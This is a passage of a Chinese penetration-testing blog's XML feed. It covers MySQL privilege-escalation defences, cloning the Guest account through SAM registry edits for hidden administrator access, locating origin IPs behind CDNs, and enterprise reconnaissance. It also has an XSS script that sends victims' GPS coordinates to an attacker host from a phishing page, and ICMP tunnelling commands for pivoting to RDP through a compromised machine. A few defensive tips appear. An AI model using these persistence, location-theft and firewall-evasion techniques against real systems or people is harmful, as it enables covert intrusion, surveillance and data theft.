title="防范"></a><strong>防范</strong></h1><ol><li>禁止具备Root账号权限的用户通过“%”进行登录。</li><li>禁止在系统使用root账号进行配置。</li><li>设置root账号密码为强密码。</li><li>对Mysql执行程序进行降权，禁止网站用户读取和下载user.frm、user.myd、user.myi。</li><li>检查数据库表中是否存在其它无关表，检查func表中的内容。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>克隆guest账户提权</title>
      <link href="/2021/02/11/74d288b5.html"/>
      <url>/2021/02/11/74d288b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用背景"><a href="#使用背景" class="headerlink" title="使用背景"></a><strong>使用背景</strong></h1><p>提权到system权限，但有防火墙拒绝添加用户和提升管理员组（仅可修改密码）。</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h1><p>既然为system权限，注册表HKEY_LOCAL_MACHINE\SAM\SAM\目录肯定是可以控制的（搭环境时权限不够需要右键开一下）。</p><p>思路：将administrator的注册表内容导出，把身份标识改为guest的01F5，再导入注册表，这样guest账户的信息就被替换为高权限了（奇葩的是还在guest组）。</p><p>可以看到，administrator的SID对应着01F4，guest的SID对应着01F5，其他用户类似。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211170029.png"></p><p>导出administrator注册表项到目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit /e a.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211192148.png"></p><p>修改后提交。ps：拿大马修改的话可能会造成乱码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit /s a.reg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211192300.png"></p><p>最后还需要设置guest密码，因为系统默认guest禁止登录并且用户密码是空的，但是克隆后并未将administrator密码克隆过来。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211195931.png"></p><p>登录后界面与administrator界面完全相同，无论administrator修改什么密码，均可用guest登录获得管理员界面。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211195956.png"></p><p>ps：以上方法在查看管理工具中的用户和组会发现修改痕迹。</p><p>解决方法：导出两个注册表项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit /e a.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</span><br><span class="line">regedit /e b.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5</span><br></pre></td></tr></table></figure><p>思路和上述类似，需要注意的是将guest注册表的从&quot;V&quot;&#x3D;hex:0开始到文件结束的内容替换掉administrator注册表同位置的部分。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210211200527.png"></p><p>随后提交a.reg。</p><p>现在guest账号拥有了管理员的权限，但是使用net.exe和管理工具中的用户管理都将看不到任何痕迹，即使去察看所属于的组和用户，都和修改前没有任何区别。</p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 注册表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CDN</title>
      <link href="/2021/02/10/e1913641.html"/>
      <url>/2021/02/10/e1913641.html</url>
      
        <content type="html"><![CDATA[<h1 id="判断"><a href="#判断" class="headerlink" title="判断"></a><strong>判断</strong></h1><p>不排除整个站都用CDN加速了的情况，几乎找不到源站ip。</p><h2 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a><strong>多地ping</strong></h2><ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> </li><li><a href="https://wepcc.com/">https://wepcc.com/</a> </li><li><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></li></ul><p>ip众多-&gt;CDN，ip几个-&gt;多线服务器，该方法只针对小网站，大网站本身ip就多，判断不准。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><strong>绕过</strong></h1><h2 id="ping二级域名或子域名"><a href="#ping二级域名或子域名" class="headerlink" title="ping二级域名或子域名"></a><strong>ping二级域名或子域名</strong></h2><p>很多CDN厂商对加速的域名个数有限制，只要求把www域名部署到CDN上去，二级域名或子域名不部署。就算部署了很多域名，但一般不会把所有的三级域名放在CDN上，可以ping三级域名获取ip，最后将目标域名绑定到这个ip，能访问就说明目标站与此三级域名在同一个服务器上，就算不在同一服务器也可能在同C段。</p><ul><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>      语法：baidu.com type:A</li></ul><h2 id="国外冷门DNS-gt-多地ping"><a href="#国外冷门DNS-gt-多地ping" class="headerlink" title="国外冷门DNS-&gt;多地ping"></a><strong>国外冷门DNS-&gt;多地ping</strong></h2><p>大部分CDN提供商只针对国内市场，国外的请求有很大的几率会直接指向真实ip。</p><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a><strong>搜索引擎</strong></h2><ul><li><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a>    </li><li><a href="https://www.fofa.so/">https://www.fofa.so/</a>                    </li><li><a href="https://www.shodan.io/">https://www.shodan.io/</a>               </li><li><a href="https://www.censys.io/">https://www.censys.io/</a></li></ul><h2 id="域名历史解析记录"><a href="#域名历史解析记录" class="headerlink" title="域名历史解析记录"></a><strong>域名历史解析记录</strong></h2><p>域名在上CDN之前用的ip，可能就是CDN的真实源ip地址。</p><ul><li><a href="https://viewdns.info/">https://viewdns.info/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </li><li><a href="https://securitytrails.com/#search">https://securitytrails.com/#search</a> </li><li><a href="https://asm.ca.com/en/dnstool.php">https://asm.ca.com/en/dnstool.php</a> </li><li><a href="https://ip138.com/">https://ip138.com/</a> </li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> </li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></li><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></li></ul><h2 id="服务器主动连"><a href="#服务器主动连" class="headerlink" title="服务器主动连"></a><strong>服务器主动连</strong></h2><h3 id="获取邮件服务器ip（包括RSS邮件订阅）"><a href="#获取邮件服务器ip（包括RSS邮件订阅）" class="headerlink" title="获取邮件服务器ip（包括RSS邮件订阅）"></a>获取邮件服务器ip（包括RSS邮件订阅）</h3><p>向用户发送邮件一般都是从真实服务器发出来的，注意找回密码或注册处。查看邮件的源代码，就能看到邮件服务器的真实ip，或处在一个网段，不排除目标使用的是公用的smtp邮件服务器….</p><h3 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h3><p>XSS盲打、命令执行反弹shell、SSRF、上传文件如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request.ServerVariables(&quot;LOCAL_ADDR&quot;)      得到服务器的ip地址 Request.ServerVariables(&quot;REMOTE_ADDR&quot;)     得到浏览当前页面的客户端的ip地址(这个有可能是代理) </span><br><span class="line">request.ServerVariables(&quot;HTTP_X_FORWARDED_FOR&quot;)    得到请求客户端真实ip地址</span><br></pre></td></tr></table></figure><h2 id="CDN回源"><a href="#CDN回源" class="headerlink" title="CDN回源"></a><strong>CDN回源</strong></h2><p>CDN除了能隐藏ip，可能分配流量，一些运营商不设防，受到攻击流量超过最大的防御值就会挂，直接回源。</p><h2 id="探针文件"><a href="#探针文件" class="headerlink" title="探针文件"></a><strong>探针文件</strong></h2><p>用工具扫，寻找探针看server info，或其他或敏感文件可能会暴露ip。</p><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a><strong>社工</strong></h2><p>搜集页面敏感信息，第三方服务js标识、姓名、邮箱、电话、公司地址等，找到相同网站。</p><h2 id="扫描全网"><a href="#扫描全网" class="headerlink" title="扫描全网"></a><strong>扫描全网</strong></h2><p>基于子域名扫描得到ip段，然后根据目标网站关键字，从ip段中批量筛选开启80和443端口的ip，再通过页面或返回头中的关键字判断。</p><ul><li><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a> </li><li><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> </li><li><a href="https://www.shodan.io/">https://www.shodan.io/</a> </li><li><a href="https://fofa.so/">https://fofa.so/</a></li></ul><h2 id="利用SSL证书"><a href="#利用SSL证书" class="headerlink" title="利用SSL证书"></a><strong>利用SSL证书</strong></h2><p>扫描全网443端口，连接到ip时证书会暴露，寻找对应证书对应的ip。</p><ul><li><a href="https://censys.io/">https://censys.io/</a>   语法如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parsed.names: xxx.com and tags.raw: trusted</span><br></pre></td></tr></table></figure><p>点击某个搜索结果-&gt;Explore-&gt;IPv4 Hosts，找到使用这个证书的ip，寻找真实ip。</p><p>若得到证书SHA1。</p><ul><li><a href="https://crt.sh/">https://crt.sh</a>          获取目标网站SSL证书SHA1</li><li><a href="https://censys.io/">https://censys.io/</a>           搜索该SHA1</li></ul><h2 id="负载均衡F5-LTM解码"><a href="#负载均衡F5-LTM解码" class="headerlink" title="负载均衡F5 LTM解码"></a><strong>负载均衡F5 LTM解码</strong></h2><p>如Set-Cookie: BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000</p><p>取487098378转换16进制为1d08880a，倒着取0a.88.08.1d，转化成十进制10.136.8.29为真实ip。</p><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a><strong>nslookup</strong></h2><p>域名的NS、MX、TXT记录等有可能指向的是真实ip或同C段服务器。VPN的ip一般会和目标ip同c段。</p><h2 id="特殊CDN记录"><a href="#特殊CDN记录" class="headerlink" title="特殊CDN记录"></a><strong>特殊CDN记录</strong></h2><p>CDN厂商cloudflare默认会配direct.domain.com指向真实ip。</p><h2 id="拿CDN服务器"><a href="#拿CDN服务器" class="headerlink" title="拿CDN服务器"></a><strong>拿CDN服务器</strong></h2><p>拿目标网站管理员在CDN的账号，查找配置。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业资产信息收集</title>
      <link href="/2021/02/10/4d442107.html"/>
      <url>/2021/02/10/4d442107.html</url>
      
        <content type="html"><![CDATA[<h1 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a><strong>资产探测</strong></h1><p>企业有很多隐性资产，需要进行信息收集扩大攻击面。</p><p>通常需要注意域名、C段、旁站、系统端口、代码托管平台、APP、微信公众号等。</p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a><strong>子域名收集</strong></h2><h3 id="综合搜索工具"><a href="#综合搜索工具" class="headerlink" title="综合搜索工具"></a><strong>综合搜索工具</strong></h3><p>主要有三大模块：搜索引擎、第三方站点、枚举。</p><ul><li><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a>  </li><li><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> </li><li><a href="https://github.com/CTF-MissFeng/bayonet">https://github.com/CTF-MissFeng/bayonet</a> </li><li><a href="https://github.com/shmilylty/OneForAll/">https://github.com/shmilylty/OneForAll/</a></li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a><strong>搜索引擎</strong></h3><p>一般搜索引擎和网络空间搜索引擎：百度、谷歌、撒旦、佛法、钟馗。</p><ul><li>Google、baidu、Bing </li><li><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a>         偏向web应用层面 </li><li><a href="https://www.fofa.so/">https://www.fofa.so/</a>                    偏向资产搜索 </li><li><a href="https://www.shodan.io/">https://www.shodan.io/</a>               偏向网络设备和和服务器 </li><li><a href="https://www.censys.io/">https://www.censys.io/</a>                偏向网络设备和和服务器</li></ul><h3 id="在线查询接口"><a href="#在线查询接口" class="headerlink" title="在线查询接口"></a><strong>在线查询接口</strong></h3><ul><li><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></li><li><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com/</a> </li><li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> </li><li><a href="https://censys.io/">https://censys.io/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li></ul><h3 id="子域名暴破"><a href="#子域名暴破" class="headerlink" title="子域名暴破"></a><strong>子域名暴破</strong></h3><p>Layer子域名挖掘机、Sublist3r、subDomain3、knock-4.1、subDomainsBrute。。。</p><h3 id="DNS查询-x2F-暴破"><a href="#DNS查询-x2F-暴破" class="headerlink" title="DNS查询&#x2F;暴破"></a><strong>DNS查询&#x2F;暴破</strong></h3><p>A、CNAME、NS、MX、IPV6等记录查询，有局限性，很多DNS是禁止查询的。</p><ul><li><a href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a> </li><li><a href="http://tools.bugscaner.com/nslookup/">http://tools.bugscaner.com/nslookup/</a> </li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>  </li><li>nslookup</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=any 目标域名 </span><br><span class="line">host -t a domainName </span><br><span class="line">host -t mx domainName </span><br><span class="line">host -t ns domainName</span><br></pre></td></tr></table></figure><p>DNS子域名暴破工具：fierce、dnsmap、dnsdict6、dnsenum、dnsrecon、dnstracer、dnswalk、urlcrazy。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fierce -dns domainName</span><br></pre></td></tr></table></figure><h3 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a><strong>HTTPS证书</strong></h3><p>证书颁发机构（CA）必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中。SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。</p><ul><li><a href="https://crt.sh/">https://crt.sh/</a> </li><li><a href="https://certdb.com/">https://certdb.com</a> </li><li><a href="https://censys.io/">https://censys.io/</a> </li><li><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a> </li><li><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration">https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration</a></li></ul><h3 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a><strong>域传送漏洞</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig @DNS服务器 目标域名 axfr</span><br><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=http://test.com -p 53 -Pn 192.168.5.6</span><br></pre></td></tr></table></figure><h2 id="相关域名收集"><a href="#相关域名收集" class="headerlink" title="相关域名收集"></a><strong>相关域名收集</strong></h2><p>兄弟域名，指的是同一个邮箱注册的域名或分公司下的域名。</p><h3 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a>在线查询网站</h3><p>天眼查和启信宝是好东西，可以查到各地分公司、旗下移动端、年度报告等等信息。</p><ul><li><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li><a href="https://www.qixin.com/">https://www.qixin.com/</a></li></ul><h3 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a><strong>旁站C段</strong></h3><p>扫完二级域名后可以用脚本把IP提取出来生成C段，然后批量扫描端口。</p><ul><li><a href="http://www.91ri.org/15674.html">http://www.91ri.org/15674.html</a></li></ul><p>在线查询</p><ul><li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></li></ul><h3 id="whois-x2F-IP反查"><a href="#whois-x2F-IP反查" class="headerlink" title="whois&#x2F;IP反查"></a><strong>whois&#x2F;IP反查</strong></h3><p>根据已知域名反查，分析出此域名的注册商、联系人、邮箱、电话等，进行反查收集名下资产或伪造邮箱、社工注册商等操作，对于小站点而言，域名所有人往往就是管理员。</p><ul><li><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> </li><li><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li><a href="https://whois.aliyun.com/">https://whois.aliyun.com</a></li></ul><p>IP反查域名，若是没有结果可能域名所有者没有添加反向解析记录，有CDN的话结果也会不准。</p><ul><li><a href="http://dns.aizhan.com/">http://dns.aizhan.com/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -x ip @dnsserver nslookup -qt=ptr IP</span><br></pre></td></tr></table></figure><h3 id="主站爬取"><a href="#主站爬取" class="headerlink" title="主站爬取"></a><strong>主站爬取</strong></h3><p>编写爬虫，访问主域名或者子域名，然后爬取页面上该域名的所有子域名，然后循环访问获取到的子域名，然后再次循环，直到爬完为止，多注意跨域策略文件crossdomain.xml。</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h3><p>不同开放端口可能找到不同的网站。</p><h3 id="APP、微信公众号"><a href="#APP、微信公众号" class="headerlink" title="APP、微信公众号"></a>APP、微信公众号</h3><p>移动端或微信公众号中可能会存在相关域名信息。</p><h1 id="针对单个站点的信息收集"><a href="#针对单个站点的信息收集" class="headerlink" title="针对单个站点的信息收集"></a><strong>针对单个站点的信息收集</strong></h1><p>针对单个站点，需要注意测试服务器IP、网站内容、域名，和上述重复的就略过。</p><h2 id="服务器IP"><a href="#服务器IP" class="headerlink" title="服务器IP"></a><strong>服务器IP</strong></h2><h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a><strong>判断CDN</strong></h3><p>如何判断CDN以及绕过方法请参考文章：</p><ul><li><a href="http://blog.v3teran.xyz/2021/02/10/%E7%BB%95%E8%BF%87CDN/">http://blog.v3teran.xyz/2021/02/10/%E7%BB%95%E8%BF%87CDN/</a></li></ul><h3 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型"></a><strong>服务器类型</strong></h3><p>修改页面后缀大小写或在线查询或nmap。</p><ul><li><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></li></ul><h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h3><p>找到存在漏洞的端口进行渗透和提权。</p><h3 id="IP位置"><a href="#IP位置" class="headerlink" title="IP位置"></a><strong>IP位置</strong></h3><ul><li><a href="https://www.ipip.net/">https://www.ipip.net/</a></li><li><a href="https://labs.ipip.net/location/ip?ip=">https://labs.ipip.net/location/ip?ip=</a></li><li><a href="http://www.hao7188.com/">http://www.hao7188.com</a> </li><li><a href="http://www.882667.com/">http://www.882667.com</a></li></ul><h2 id="网站内容"><a href="#网站内容" class="headerlink" title="网站内容"></a><strong>网站内容</strong></h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a><strong>目录结构</strong></h3><p>robots.txt、后台目录、安装包、上传目录、mysql管理页面、phpinfo、编辑器、备份文件、测试文件、SVN源码泄露等。</p><p>找后台的方法：</p><ul><li>页面源代码注释或结尾或版权处 </li><li>图片属性 </li><li>工具爆破</li><li>robots.txt </li><li>搜索引擎 </li><li>短文件名 </li><li>XSS或社工 </li><li>编辑器默认后台</li></ul><h3 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a><strong>网站架构</strong></h3><p>中间件类型，返回包或在线网站查询或通过报错信息查看。</p><ul><li><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></li></ul><p>脚本语言类型：修改页面后缀、爬虫工具。</p><p>一般网站架构配置：</p><ul><li>ASP+ACCESS+IIS 5.0&#x2F;6.0+WIN2003 </li><li>ASPX+MSSQL+IIS 7.0&#x2F;7.5+WIN2008 </li><li>PHP+MYSQL+IIS </li><li>PHP+MYSQL+APACHE </li><li>PHP+MYSQL+NGNIX </li><li>JSP+MYSQL+NGNIX </li><li>JSP+MSSQL+TOMCAT </li><li>JSP+ORACLE+TOMCAT </li><li>PHP+POSTGRESQL</li></ul><h3 id="代码托管平台泄露"><a href="#代码托管平台泄露" class="headerlink" title="代码托管平台泄露"></a>代码托管平台泄露</h3><p>Github、Coding、Gitee，通过爆破或爬虫进行扫描或google。</p><h3 id="web指纹"><a href="#web指纹" class="headerlink" title="web指纹"></a><strong>web指纹</strong></h3><p>框架信息。</p><ul><li><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a> </li><li><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li></ul><h3 id="防护软件"><a href="#防护软件" class="headerlink" title="防护软件"></a><strong>防护软件</strong></h3><p>waf、防火墙等。</p><ul><li><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> </li><li><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li></ul><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a><strong>域名</strong></h2><p>子域名。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.cnblogs.com/-ying-/p/11820265.html">https://www.cnblogs.com/-ying-/p/11820265.html</a></p><p><a href="http://www.91ri.org/15674.html">http://www.91ri.org/15674.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS平台GPS定位</title>
      <link href="/2021/02/10/cfb7c039.html"/>
      <url>/2021/02/10/cfb7c039.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h1><p>利用H5自带的GPS对象，通过JavaScript来获取和处理经纬度信息，像使用XSS平台打Cookie那样，将利用代码抽象成一段js外链，只需要在自己的钓鱼页面中引入这段js外链即可。</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a><strong>复现</strong></h1><p>在XSS平台上创建项目，插入获取定位的模板。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function getLocation() //获取GPS定位方法</span><br><span class="line">&#123;</span><br><span class="line">    if (navigator.geolocation) &#123;</span><br><span class="line">        navigator.geolocation.getCurrentPosition(showPosition);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        x.innerHTML = &quot;Geolocation is not supported by this browser.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showPosition(position) &#123;</span><br><span class="line">    //alert(&quot;Latitude: &quot; + position.coords.latitude + &quot;Longitude: &quot; + position.coords.longitude);</span><br><span class="line">    (new Image()).src = &#x27;http://xxxxxxxxxxxxx/xxxx.php?weidu=&#x27; + position.coords.latitude + &#x27;&amp;jingdu=&#x27; + position.coords.longitude; //向XSS平台发送经纬度信息</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getLocation();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210210193333.png"></p><p>生成外链插入到事先准备好的钓鱼页面中。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210210193511.png"></p><p>有人点击后会受到提醒。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210210193634.png"></p><p>ps：自测苹果手机微信浏览器和safari浏览器不成功，安卓手机微信浏览器不成功，普通浏览器成功，电脑IE浏览器成功，其他浏览器不成功。</p><p>pps：成功的前提均是在有定位权限的情况下。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=33742&amp;highlight=GPS%E5%AE%9A%E4%BD%8D">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=33742&amp;highlight=GPS%E5%AE%9A%E4%BD%8D</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种通信隧道</title>
      <link href="/2021/02/09/de1cbd20.html"/>
      <url>/2021/02/09/de1cbd20.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网络层：IPV6、ICMP、GRE</p><p>传输层：TCP、UDP、常规端口转发</p><p>应用层：SSH、HTTP、HTTPS、DNS</p><h1 id="IPV6隧道"><a href="#IPV6隧道" class="headerlink" title="IPV6隧道"></a><strong>IPV6隧道</strong></h1><p>原理：将IPV6报文封装在IPV4报文中，通过IPV4隧道传输。</p><p>现阶段边界设备、防火墙等还无法识别IPV6通信数据，攻击者会通过恶意软件来配置允许进行IPV6通信的设备，避开防火墙和IDS。</p><p>支持IPV6的隧道工具：socat、6tunnnel、nt6tunnel</p><h1 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a><strong>ICMP隧道</strong></h1><p>若使用各类上层隧道如HTTP等操作都失败了，可以建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的Ping数据包中，穿过防火墙。大多数管理员会阻止ICMP通信进入系统，但允许其从系统出去，大多数网络和边界设备不会过滤ICMP流量。</p><p>常用ICMP隧道工具：icmpsh、PingTunnel、icmptunnel、powershell icmp</p><h2 id="PingTunnel-端口转发"><a href="#PingTunnel-端口转发" class="headerlink" title="PingTunnel-端口转发"></a><strong>PingTunnel-端口转发</strong></h2><p>相当于创建一个代理，前提是存在wincap（libpcap）类库，跨平台。</p><p>linux版本环境部署（win版暂未尝试）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y byacc </span><br><span class="line">apt-get install flex </span><br><span class="line">tar zxvf libpcap-1.9.1.tar.gz </span><br><span class="line">./configure </span><br><span class="line">make &amp;&amp; make install </span><br><span class="line">tar xf PingTunnel-0.72.tar.gz </span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>常用参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代理：ptunnel -x 密码 -u -c 网络设备 -v 详细程度 -f 日志文件 </span><br><span class="line">客户端：ptunnel -x 密码 -p 代理地址 -lp 监听端口 -da 目标地址 -dp 目标端口 -c 网络设备 -v 详细程度 -f 日志文件 -u</span><br></pre></td></tr></table></figure><p>思路：机器A无法直接访问目标核心数据库系统，只能通过ping命令访问，建立ICMP隧道，最后本地访问VPS的1080端口，相当于访问目标的3389端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">已拿下的机器A：ptunnel -x wawawa         开启隧道，充当于代理 </span><br><span class="line">VPS：ptunnel -p A的公网IP -lp 1080 -da 目标系统IP -dp 3389 -x wawawa</span><br></pre></td></tr></table></figure><p>防御</p><ol><li>检测同一来源的ICMP数据包数量，一个正常ping命令每秒最多发两个数据包。</li><li>注意payload大于64bit的ICMP包。</li><li>寻找响应包中Payload与请求包中Payload不一致的ICMP包。</li><li>检查ICMP包协议标签。</li></ol><h1 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a><strong>传输层隧道</strong></h1><h2 id="lcx-端口转发"><a href="#lcx-端口转发" class="headerlink" 